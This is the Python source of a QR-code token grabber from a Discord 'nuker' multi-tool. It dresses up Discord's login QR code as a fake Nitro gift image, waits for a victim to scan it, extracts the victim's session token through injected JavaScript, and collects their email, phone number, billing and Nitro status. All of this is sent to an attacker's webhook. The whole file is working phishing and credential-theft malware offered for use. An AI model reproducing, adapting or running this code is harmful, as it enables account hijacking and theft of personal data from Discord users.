# Coded / Dev: ††#9999 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# GANG Discord Nuker / Multi Tool©
# Copyright © 2022
########################################


import os
import sys
import json
import base64
import requests
from PIL import Image
from time import sleep
from colorama import Fore
from zipfile import ZipFile
from bs4 import BeautifulSoup
from urllib.request import urlretrieve
from selenium import webdriver, common

from utilities.Settings.common import getDriver, getheaders, SlowPrint

def logo_qr():
    im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im1.paste(im2, (60, 55), im2)
    im1.save('QR-Code/Qr_Code.png', quality=95)

def paste_template():
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/Qr_Code.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('QR-Code/discord_gift.png', quality=95)

def QR_Grabber(Webhook):
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            spammer()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            spammer()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"Enter anything to continue. . .")
            input()
            spammer()
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
        sleep(3)
        print("Enter anything to continue. . . ", end="")
        input()
        spammer()

    driver.get('https://discord.com/login')
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    SlowPrint(f"\n{Fore.WHITE}Downloading QR Templates!")

    urlretrieve(
        "https://github.com/TT-Tutorials/addons/raw/main/GANG-Nuker%20Addons/QR-Code.zip",
        filename="QR-Code.zip",
    )
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")

    print(f'\nQR Code generated in '+os.getcwd()+"\\QR-Code")
    print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Don\'t Close This Window! This will ensure that you get there info through the webhook!')
    print(f'[\x1b[95m>\x1b[95m\x1B[37m] Wait for victim to scan the QR Code...')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    if sys.argv[0].endswith(".exe"):
        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Opening Another GANG-Nuker File')
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "No Phone Number attached"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

            embed = {
                "avatar_url":"https://media.discordapp.net/attachments/878154522978029582/917679300705124412/a4235fd1da45633adbc305450741b506.png",
                "embeds": [
                    {
                        "author": {
                            "name": "GANG-Nuker | QR Token Grabber",
                            "url": "https://github.com/TT-Tutorials/GANG-Nuker",
                            "icon_url": "https://cdn.discordapp.com/attachments/982965691093254154/994193135213228092/GANGGRABBER.gif"
                        },
                        "description": f"**{user}** Just Scanned the QR Code!\n**[Avatar]({url})**\n\n**Email:** {email}\n**Phone:** {phone}\n**Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```fix\n{token}```",
                              "inline": False
                            }
                        ],
                        "color": 12208895,

                        "footer": {
                          "text": "https://github.com/TT-Tutorials  |  https://github.com/TT-Tutorials/GANG-Nuker"
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            break
